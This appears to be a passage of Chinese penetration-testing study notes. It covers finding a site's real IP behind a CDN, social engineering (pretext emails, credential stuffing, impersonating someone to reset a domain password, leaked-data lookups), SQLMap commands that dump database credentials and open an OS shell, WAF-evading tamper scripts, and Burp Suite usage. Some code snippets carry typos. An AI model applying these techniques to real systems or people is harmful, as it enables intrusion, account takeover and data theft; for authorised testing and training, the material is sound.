<li>绕过CloudFlare CDN查找真实IP。现在很多网站都使用CloudFlare提供的<br>CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站<a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.crimeflare.com/">Cloud<br>FlareWatch</a>对CloudFlare客户网站进行真实IP查询</li>
</ul>
<p>参考资料:</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.uedbox.com/post/65312/">13种绕过CDN查找真实IP的方法</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.ddosi.com/cdnip/">绕过cdn查找网站真实ip借助网络空间搜索引擎</a></p>
<h4 id="4-验证获取的IP"><a href="#4-验证获取的IP" class="headerlink" title="4.验证获取的IP"></a>4.验证获取的IP</h4><p>找到目标的真实IP以后，如何验证其真实性呢?如果是Web,最简单的验证方法是直接尝试用IP访问，看看响应的页面是不是和访问域名返回的一样;或者在目标段比较大的情况下，借助类似Masscan的工具批扫描对应IP段中所有开了80、443、8080端口的IP，然后逐个尝试IP访问，观察响应结果是否为目标站点。</p>
<h3 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h3><p>在渗透测试中，探测Web目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的后台管理页面、文件上传界面，甚至可能扫描出网站的源代码。</p>
<p>针对网站目录的扫描主要有DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py(轻量级快速单文件目录后台扫描)、Sensitivefilescan(轻量级快速单文件目录后台扫描)、Weakfilescan(轻量级快速单文件目录后台扫描)等工具。</p>
<p>除此之外，还可以利用很多在线工具站，效果也相当不错，这里推荐一个: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.webscan.cc/">WebScan</a>.</p>
<h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>社会工程学在渗透测试中起着不小的作用，利用社会工程学，攻击者可以从一<br>名员工的口中挖掘出本应该是秘密的信息。</p>
<p>假设攻击者对一家公司进行渗透测试，正在收集目标的真实IP阶段，此时就可以利用收集到的这家公司的某位销售人员的电子邮箱。首先，给这位销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。</p>
<p>通过进一步地应用社会工程学，假设现在已经收集了目标人物的邮箱、QQ、电话号码、姓名，以及域名服务商，也通过爆破或者撞库的方法获取邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持。</p>
<p>除此以外，还可以利用“社工库”查询想要得到的信息，社工库是用社会工程学进行攻击时积累的各方数据的结构化数据库。这个数据库里有大量信息，甚至可以找到每个人的各种行为记录。利用收集到的邮箱，可以在社工库中找到已经泄露的密码，其实还可以通过搜索引擎搜索到社交账号等信息，然后通过利用社交和社会工程学得到的信息构造密码字典，对目标用户的邮箱和OA账号进行爆破或者撞库.</p>
<h2 id="常用的渗透测试工具"><a href="#常用的渗透测试工具" class="headerlink" title="常用的渗透测试工具"></a>常用的渗透测试工具</h2><h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h3><p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、sQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了以下5种独特的SQL注入技术。</p>
<ul>
<li>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入。</li>
<li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</li>
<li>联合查询注入，在可以使用Union的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句时的注入。</li>
</ul>
<p>SQLMap的强大的功能包括数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时实行任意命令。SQLMap的功能强大到让人惊叹，当常规的注入工具不能利用SQL注入漏洞进行注入时，使用SQLMap会有意想不到的效果。</p>
<h4 id="SQLMap入门"><a href="#SQLMap入门" class="headerlink" title="SQLMap入门"></a>SQLMap入门</h4><h5 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h5><p>假设目标注入点是<a target="_blank" rel="noopener external nofollow noreferrer" href="http://challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800/?id=1,判断其是否存在注入的命令如下所示">http://challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800/?id=1,判断其是否存在注入的命令如下所示</a>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711143031706.png" alt=""></p>
<p>还有一种情况， 当注入点后面的参数大于等于两个时，需要加双引号，如下所<br>示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&amp;uid&#x3D;2&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到，运行完判断是否存在注入的语句后，”爆出”一大段代码，下面来分析代码反馈给我们的信息。这里有三处需要选择的地方:第一处的意思为检测到数据库可能是MySQL,是否需要跳过检测其他数据库;第二处的意思是在”level1、risk1”的情况下，是否使用MySQL对应的所有Payload进行检测;第三处的意思是参数ID存在漏洞，是否要继续检测其他参数，一般默认按回车键即可，如下所示。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711143817878.png" alt=""></p>
<h5 id="2-判断文本中的请求是否存在注入"><a href="#2-判断文本中的请求是否存在注入" class="headerlink" title="2.判断文本中的请求是否存在注入"></a>2.判断文本中的请求是否存在注入</h5><p>从文件中加载HTTP请求，SQLMap可以从一个文本文件中获取HTTP请求，这样就可以不设置其他参数(如cookie、POST数据等)，txt文件中的内容为Web数据包。</p>
<p>判断是否存在注入的命令如下所示，-r一般在存在cookie注入时使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r desktop&#x2F;1.txt</span><br></pre></td></tr></table></figure>
<h5 id="3-查询当前用户下的所有数据库"><a href="#3-查询当前用户下的所有数据库" class="headerlink" title="3.查询当前用户下的所有数据库"></a>3.查询当前用户下的所有数据库</h5><p>该命令是确定网站存在注入后，用于查询当前用户下的所有数据库。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库，如图3-7所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711145601887.png" alt=""></p>
<p>从下图中可以看到，查询出了4个数据库及所有数据库的库名。当继续注入时，—dbs缩写成-D xxx，其意思是在xxx数据库中继续查询其他数据。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711145728862.png" alt=""></p>
<h5 id="4-获取数据库中的表名"><a href="#4-获取数据库中的表名" class="headerlink" title="4.获取数据库中的表名"></a>4.获取数据库中的表名</h5><p>该命令的作用是查询完数据库后，查询指定数据库中所有的表名，如下所示。<br>如果在该命令中不加入-D参数来指定某一个具体的数据库，那么SQLMap会列出数据<br>库中所有库的表，如图3-8所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 -D sqli --tables</span><br></pre></td></tr></table></figure>
<p>当继续注入时，—tables缩写成-T，意思是在某表中继续查询。</p>
<h5 id="5-获取表中的字段名"><a href="#5-获取表中的字段名" class="headerlink" title="5.获取表中的字段名"></a>5.获取表中的字段名</h5><p>该命令的作用是查询完表名后，查询该表中所有的字段名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; -D sqli -T flag --columns</span><br></pre></td></tr></table></figure>
<p>在后续的注入中,—columns缩写成-C.</p>
<h5 id="6-获取字段内容"><a href="#6-获取字段内容" class="headerlink" title="6.获取字段内容"></a>6.获取字段内容</h5><p>该命令是查询完字段名之后，获取该字段中具体的数据信息，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; -D sqli -T flag -C username,password --dump</span><br></pre></td></tr></table></figure>
<p>这里需要获取的数据是sqli数据库里flag表中username和password的值</p>
<h5 id="7-获取数据库的所有用户"><a href="#7-获取数据库的所有用户" class="headerlink" title="7.获取数据库的所有用户"></a>7.获取数据库的所有用户</h5><p>该命令的作用是列出数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --users</span><br></pre></td></tr></table></figure>
<h5 id="8-获取数据库用户的密码"><a href="#8-获取数据库用户的密码" class="headerlink" title="8.获取数据库用户的密码"></a>8.获取数据库用户的密码</h5><p>该命令的作用是列出数据库用户的密码，如下所示。如果当前用户有读取包含用户密码的权限，SQLMap会先列举出用户，然后列出Hash,并尝试破解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --passwords</span><br></pre></td></tr></table></figure>
<p>密码使用MD5加密，可以在<a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.cmd5.com中自行解密。">http://www.cmd5.com中自行解密。</a></p>
<h5 id="9-获取当前网站数据库的名称"><a href="#9-获取当前网站数据库的名称" class="headerlink" title="9.获取当前网站数据库的名称"></a>9.获取当前网站数据库的名称</h5><p>使用该命令可以列出当前网站使用的数据库，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
<h5 id="10-获取当前网站数据库的用户名称"><a href="#10-获取当前网站数据库的用户名称" class="headerlink" title="10.获取当前网站数据库的用户名称"></a>10.获取当前网站数据库的用户名称</h5><p>使用该命令可以列出当前网站使用的数据库用户，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --current-user</span><br></pre></td></tr></table></figure>
<h4 id="SQLMap进阶"><a href="#SQLMap进阶" class="headerlink" title="SQLMap进阶"></a>SQLMap进阶</h4><h5 id="1-—level-5-探测等级"><a href="#1-—level-5-探测等级" class="headerlink" title="1.—level 5:探测等级"></a>1.—level 5:探测等级</h5><p>参数—level 5指需要执行的测试等级，一共有5个等级(1~5)，可不加level,默认是1。SQLMap使用的Payload可以在xml/payloads.xml中看到，也可以根据相应的格式添加自己的Payload,其中5级包含的Payload最多，会自动破解出cookie、XFF等头部注入。当然，level 5的运行速度也比较慢。<br>这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP<br>cookie在level为2时就会测试，HTTP User Agent/Referer头在level为3时就会测试。<br>总之，在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值。</p>
<h5 id="2-—is-dba-当前用户是否为管理权限"><a href="#2-—is-dba-当前用户是否为管理权限" class="headerlink" title="2.—is-dba:当前用户是否为管理权限"></a>2.—is-dba:当前用户是否为管理权限</h5><p>该命令用于查看当前账户是否为数据库管理员账户，如下所示，在本案例中输入该命令，会返回Ture或False</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.7&#x2F;sql&#x2F;union.php?id&#x3D;1&quot; --is-dba</span><br></pre></td></tr></table></figure>
<h5 id="3-—roles-列出数据库管理员角色"><a href="#3-—roles-列出数据库管理员角色" class="headerlink" title="3.—roles:列出数据库管理员角色"></a>3.—roles:列出数据库管理员角色</h5><p>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。该命令仅适用于当前数据库是Oracle的时候</p>
<h5 id="4-—referer-HTTP-Referer头"><a href="#4-—referer-HTTP-Referer头" class="headerlink" title="4.—referer:HTTP Referer头"></a>4.—referer:HTTP Referer头</h5><p>SQLMap可以在请求中伪造HTTP中的referer,当—level参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如—referer <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.baidu.com">http://www.baidu.com</a>.</p>
<h5 id="5-—sql-shell-运行自定义SQL语句"><a href="#5-—sql-shell-运行自定义SQL语句" class="headerlink" title="5.—sql-shell:运行自定义SQL语句"></a>5.—sql-shell:运行自定义SQL语句</h5><p>该命令用于执行指定的SQL语句，如下所示，假设执行select * from users<br>limit O,1语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.7&#x2F;sql&#x2F;union.php?id&#x3D;1&quot; --sq|-shell</span><br></pre></td></tr></table></figure>
<h5 id="6-—os-cmd-—os-shell-运行任意操作系统命令"><a href="#6-—os-cmd-—os-shell-运行任意操作系统命令" class="headerlink" title="6.—os-cmd,—os-shell:运行任意操作系统命令"></a>6.—os-cmd,—os-shell:运行任意操作系统命令</h5><p>在数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，如果数据库为MySQL、PostgreSQL, SQLMap上传一个二进制库，包含用户自定义的函数sys_exec()和sys_eval()，那么创建的这两个函数就可以执行系统命令。在Microsoft SQL Server中，SQLMap将使用xp_cmdshell存储过程，如果被禁用(在Microsoft SQL Server 2005及以上版本默认被禁制)，则SQLMap会重新启用它;如果不存在，会自动创建。<br>用—os-shell参数可以模拟一个真实的Shell,输入想执行的命令。当不能执行多语句时(比如PHP或ASP的后端数据库为MySQL)，仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门。—os-shell支持ASP、ASP.NET、JSP和PHP四种语言(要想执行改参数，需要有数据库管理员权限，也就是—is-dba的值要为True)。</p>
<h5 id="7-—file-read-从数据库服务器中读取文件"><a href="#7-—file-read-从数据库服务器中读取文件" class="headerlink" title="7.—file-read:从数据库服务器中读取文件"></a>7.—file-read:从数据库服务器中读取文件</h5><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</p>
<h5 id="8-—file-write-—file-dest-上传文件到数据库服务器中"><a href="#8-—file-write-—file-dest-上传文件到数据库服务器中" class="headerlink" title="8.—file-write —file-dest:上传文件到数据库服务器中"></a>8.—file-write —file-dest:上传文件到数据库服务器中</h5><p>该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</p>
<h4 id="SQLMap自带绕过脚本tamper的讲解"><a href="#SQLMap自带绕过脚本tamper的讲解" class="headerlink" title="SQLMap自带绕过脚本tamper的讲解"></a>SQLMap自带绕过脚本tamper的讲解</h4><p>SQLMap在默认情况下除了使用CHAR()函数防止出现单引号，没有对注入的数据进行修改，读者还可以使用—tamper参数对数据做修改来绕过WAF等设备，其中大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则，命令如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap XXXXX --tamper &quot;模块名&quot;</span><br></pre></td></tr></table></figure>
<p>下面是一个tamper脚本的格式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sqlmap&#x2F;tamper&#x2F;esc apequotes.py</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">_priority_ &#x3D; PRIORITY.LOWEST</span><br><span class="line">def dependencies():</span><br><span class="line">	pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">	return pay1oad.replace(&quot;&#39;&quot;,&quot;\\&#39;&quot;).replace(&#39;&quot;&#39;,&#39;\\&quot;&#39;)</span><br></pre></td></tr></table></figure>
<p>不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。</p>
<ul>
<li>priority定义脚本的优先级，用于有多个tamper脚本的情况。</li>
<li>dependencies函数声明该脚本适用/不适用的范围，可以为空。</li>
</ul>
<p>下面以一个转大写字符绕过的脚本为例，tamper绕过脚本主要由dependencies和tamper两个函数构成。def tamper(payload, **kwargs) 函数接收playload和**kwargs返回一个Payload。下面这段代码的意思是通过正则匹配所有字符，将所有攻击载荷中的字符转换为大写字母。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def tamper(pay1oad,**kwargs):</span><br><span class="line">	retval &#x3D; payload</span><br><span class="line">    if payload:</span><br><span class="line">    	for match in re.finditer(r&quot;[A-Za-z_]+&quot;,retVal):</span><br><span class="line">    		word &#x3D; match.group()</span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">            retVal &#x3D; retVal.replace(word,word.upper())</span><br><span class="line">    return retval</span><br></pre></td></tr></table></figure>
<p>在日常使用中，我们会对一些网站是否有安全防护(WAF/IDS/IPS)进行试探，可以使用参数—identify-waf进行检测。</p>
<h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>Burp Suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数据、服务器端的返回信息等。Burp Suite主要拦截HTTP和HTTPS协议的流量，通过拦截，Burp Suite以中间人的方式对客户端的请求数据、服务端的返回信息做各种处理，以达到安全测试的目的。</p>
<h4 id="Burp-Suite入门"><a href="#Burp-Suite入门" class="headerlink" title="Burp Suite入门"></a>Burp Suite入门</h4><p>在日常工作中，最常用的Web客户端就是Web浏览器，我们可以通过设置代理信息，拦截Web浏览器的流量,并对经过Burp Suite代理的流量数据进行处理。</p>
<p>Burp Suite运行后，Burp Proxy默认本地代理端口为8080</p>
<p><img src="https://i.loli.net/2021/05/16/mEcBXU3rwgNjDGo.png" alt=""></p>
<p>这里以Firefox浏览器为例，单击浏览器右上角”打开菜单”，依次单击”首选项”→”常规”→”网络设置”→”设置”→”手动配置代理”，设置HTTP代理为127.0.0.1,端口为8080,与Burp Proxy中的代理一致。</p>
<p><img src="https://i.loli.net/2021/05/16/LPQmOYiM9laxuNZ.png" alt=""></p>
<p><img src="https://i.loli.net/2021/05/16/gtxIL69c3DOPjiH.png" alt=""></p>
<p><img src="https://i.loli.net/2021/05/16/EgpWPxyozJOCbXk.png" alt=""></p>
<h5 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h5><p>Burp Proxy是利用Burp开展测试流程的核心，通过代理模式，可以让我们拦截、查看、修改所有在客户端与服务端之间传输的数据。</p>
<p><img src="https://i.loli.net/2021/05/16/12Q5rDLZIb6dVnv.png" alt=""></p>
<p>Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off和Action构成，它们的功能如下所示。</p>
<ul>
<li>Forward表示将拦截的数据包或修改后的数据包发送至服务器端。</li>
<li>Drop表示丢弃当前拦截的数据包。</li>
<li>Interception is on表示开启拦截功能，单击后变为Interception is off, 表示关闭拦截功能。</li>
<li>单击Action按钮，可以将数据包进一步发送到Spider、Scanner、Repeater、Intruder等功能组件做进一 步的测试，同时也包含改变数据包请求方式及其body的编码等功能。</li>
</ul>
<p>打开浏览器，输入需要访问的URL并按回车键，这时将看到数据流量经过Burp Proxy并暂停，直到单击Forward按钮，才会继续传输下去。如果单击了Drop按钮，这次通过的数据将丢失，不再继续处理。</p>
<p><img src="https://i.loli.net/2021/05/16/EbY7sNiQvn5lA6u.png" alt=""></p>
<p>当Burp Suite拦截的客户端和服务器交互之后，我们可以在Burp Suite的消息分析选项中查看这次请求的实体内容、消息头、请求参数等信息。Burp有四种消息类型显示数据包: Raw、Params、Headers和Hex。</p>
<ul>
<li>Raw主要显示Web请求的raw格式，以纯文本的形式显示数据包，包含请求地址、HTTP协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等，可以通过手动修改这些信息，对服务器端进行渗透测试。</li>
<li>Params主要显示客户端请求的参数信息，包括GET或者POST请求的参数、cookie参数。可以通过修改这些请求参数完成对服务器端的渗透测试。</li>
<li>Headers中显示的是数据包中的头信息，以名称、值的形式显示数据包。</li>
<li>Hex对应的是Raw中信息的二进制内容，可以通过Hex编辑器对请求的内容进行修改，在进行00截断时非常好用。</li>
</ul>
<h5 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h5><p>Spider的蜘蛛爬行功能可以帮助我们了解系统的结构，其中Spider爬取到的内容将在Target中展示，界面左侧为一个主机和目录树，选择具体某一个分支即可查看对应的请求与响应。</p>
<h5 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h5><p>Decoder的功能比较简单，它是Burp中自带的编码解码及散列转换的工具，能对原始数据进行各种编码格式和散列的转换。</p>
<p>Decoder的界面如图3-25所示。输入域显示的是需要编码/解码的原始数据，此处可以直接填写或粘贴，也可以通过其他Burp工具上下文菜单中的”Send to Decoder”选项发送过来;输出域显示的是对输入域中原始数据进行编码/解码的结果。无论是输入域还是输出域都支持文本和Hex这两种格式，编码解码选项由解码选项(Decode as)、编码选项 (Encode as)、散列 (Hash)构成。在实际使用时，可<br>以根据场景的需要进行设置。 </p>
<p><img src="https://i.loli.net/2021/05/16/8tx7sZk9n5RJrvV.png" alt=""></p>
<h4 id="Burp-Suite进阶"><a href="#Burp-Suite进阶" class="headerlink" title="Burp Suite进阶"></a>Burp Suite进阶</h4><h5 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h5><p>Burp Scanner主要用于自动检测Web系统的各种漏洞。此处介绍Burp<br>Scanner的基本使用方法，在实际使用中可能会有所改变，但大体环节如下。首先，确认Burp Suite正常启动并完成浏览器代理的配置。然后进入Burp<br>Proxy,关闭代理拦截功能，快速浏览需要扫描的域或URL模块，此时在默认情况下，Burp Scanner会扫描通过代理服务的请求，并对请求的消息进行分析来辨别是否存在系统漏洞。而且当我们打开Burp Target时，也会在站点地图中显示请求的URL树。</p>
<p>我们随便找一个网站进行测试，选择Burp Target的站点地图选项下的链接，在其链接URL上右击选择”Actively scan this host”</p>
<p><img src="https://i.loli.net/2021/05/16/t9esV3JIkX6LbHx.png" alt=""></p>
<p>此时会弹出过滤设置，保持默认选项即可扫描整个域</p>
<p><img src="https://i.loli.net/2021/05/16/XGtoPSdup8I2D19.png" alt=""></p>
<p><img src="https://i.loli.net/2021/05/16/MsniFYa9w6fgpHo.png" alt=""></p>
<p>也可以在Proxy下的HTTP history中，选择某个节点上的链接URL并右击选择Do an active scan进行扫描</p>
<p><img src="https://i.loli.net/2021/05/16/yY9CNxk6QO8nlEM.png" alt=""></p>
<p>这时，Burp Scanner开始扫描，在Scanner界面下双击即可看到扫描结果</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210516120022385.png" alt=""></p>
<p>我们也可以在扫描结果中选中需要进行分析的部分，将其发送到repeater模块<br>中进行模拟提交分析和验证</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210516120134680.png" alt=""></p>
<p>当scanner扫描完成后，可以右击Burp Target站点地图选项下的链接，依次选择”issues” “Report issues”选项，然后导出漏洞报告.</p>
<p>Burp Scanner主要有主动扫描和被动扫描两种扫描方式:</p>
<h6 id="1-主动扫描-Active-Scanning"><a href="#1-主动扫描-Active-Scanning" class="headerlink" title="1.主动扫描(Active Scanning)"></a>1.主动扫描(Active Scanning)</h6><p>当使用主动扫描模式时，Burp会向应用发送新的请求并通过Payload验证漏洞。这种模式下的操作会产生大量的请求和应答数据，直接影响服务端的性能，通常用于非生产环境。主动扫描适用于以下这两类漏洞。</p>
<ul>
<li>客户端的漏洞，如XSS、HTTP头注入、操作重定向。</li>
<li>服务端的漏洞，如SQL注入、命令行注入、文件遍历。</li>
</ul>
<p>对第一类漏洞，Burp在检测时会提交input域，然后根据应答的数据进行解析。在检测过程中，Burp会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人的行为，以达到检测漏洞的目的;对第二类漏洞，以SQL注入为例，服务端有可能返回数据库错误提示信息，也有可能什么都不反馈。Burp在检测过程中会采用各个技术验证漏洞是否存在，例如诱导时间延迟、强制修改Boolean值、与模糊测试的结果进行比较，以提高漏洞扫描报告的准确性。</p>
<h6 id="2-被动扫描-Passive-Scanning"><a href="#2-被动扫描-Passive-Scanning" class="headerlink" title="2.被动扫描(Passive Scanning)"></a>2.被动扫描(Passive Scanning)</h6><p>当使用被动扫描模式时，Burp不会重新发送新的请求，只是对已经存在的请求和应答进行分析，对服务端的检测来说，这比较安全，通常适用于生产环境的检测。一般来说，下列漏洞在被动模式中容易被检测出来。</p>
<ul>
<li>提交的密码为未加密的明文。</li>
<li>不安全的cookie的属性，例如缺少HttpOnly和安全标志。</li>
<li>cookie的范围缺失。</li>
<li>跨域脚本包含和站点引用泄露。</li>
<li>表单值自动填充，尤其是密码。</li>
<li>SSL保护的内容缓存。</li>
<li>目录列表。</li>
<li>提交密码后应答延迟。</li>
<li>session令牌的不安全传输。</li>
<li>敏感信息泄露，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄露。</li>
<li>不安全的ViewState的配置。</li>
<li>错误或不规范的Content-Type指令。</li>
</ul>
<p>虽然被动扫描模式相比主动模式有很多不足，但同时也具有主动模式不具备的优点。除了对服务端的检测比较安全,当某种业务场景的测试每次都会破坏业务场景的某方面功能时，可以使用被动扫描模式验证是否存在漏洞，以减少测试的风险。</p>
<h5 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h5><p>Intruder是一个定制的高度可配置的工具，可以对Web应用程序进行自动化攻击，如通过标识符枚举用户名、ID和账户号码，模糊测试，SQL注入，跨站，目录遍历<br>等。<br>它的工作原理是Intruder在原始请求数据的基础上，通过修改各种请求参数获取不同的请求应答。在每一次请求中，Intruder通常会携带一个或多个有效攻击载荷(Payload)，在不同的位置进行攻击重放，通过应答数据的比对分析获得需要的特征数据。Burp Intruder通常被应用于以下场景。</p>
<ul>
<li>标识符枚举。Web应用程序经常使用标识符引用用户、账户、资产等数据信息。例如，用户名、文件ID和账户号码。</li>
<li>提取有用的数据。在某些场景下，不是简单地识别有效标识符，而是通过简单标识符提取其他数据。例如，通过用户的个人空间ID获取所有用户在其个人空间的名字和年龄。</li>
<li>模糊测试。很多输入型的漏洞(如SQL注入、跨站点脚本和文件路径遍历)可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。受限于应用程序的大小和复杂性，手动执行这个测试是一个耗时且烦琐的过程，因此可以设置Payload,通过Burp Intruder自动化地对Web应用程序进行模糊测试</li>
</ul>
<p>Intruder攻击模式:</p>
<ul>
<li>Sniper模式使用单一的Payload组。它会针对每个位置设置Payload.这种攻击类型适用于对常见漏洞中的请求参数单独进行Fuzzing测试的情景。攻击中的请求总数应该是position数量和Payload数量的乘积。</li>
<li>Battering ram模式使用单一的Payload组。它会重复Payload并一次性把所有相同的Payload放入指定的位置中。这种攻击适用于需要在请求中把相同的输入放到多个位置的情景。请求的总数是Payload组中Payload的总数。</li>
<li>Pitchfork模式使用多个Payload组。攻击会同步迭代所有的Payload组，把Payload放入每个定义的位置中。这种攻击类型非常适合在不同位置中需要插入不同但相似输入的情况。请求的数量应该是最小的Payload组中的Payload数量。</li>
<li>Cluster bomb模式会使用多个Payload组。每个定义的位置中有不同的Payload组。攻击会迭代每个Payload组，每种Payload组合都会被测试一遍。这种攻击适用于在位置中需要不同且不相关或者未知输入攻击的情景。攻击请求的总数是各Payload组中Payload数量的乘积。</li>
</ul>
<h5 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h5><p>Burp Repeater是一个手动修改、补发个别HTTP请求，并分析它们的响应的工具。它最大的用途就是能和其他Burp Suite工具结合起来使用。可以将目标站点地图、Burp Proxy浏览记录、Burp Intruder的攻击结果，发送到Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。</p>
<p>Repeater分析选项有4种: Raw、Params、Headers和Hex。</p>
<ul>
<li>Raw:显示纯文本格式的消息。在文本面板的底部有一个搜索和加亮的功能，可以用来快速定位需要寻找的字符串，如出错消息。利用搜索栏左边的弹出项，能控制状况的灵敏度，以及是否使用简单文本或十六进制进行搜索。</li>
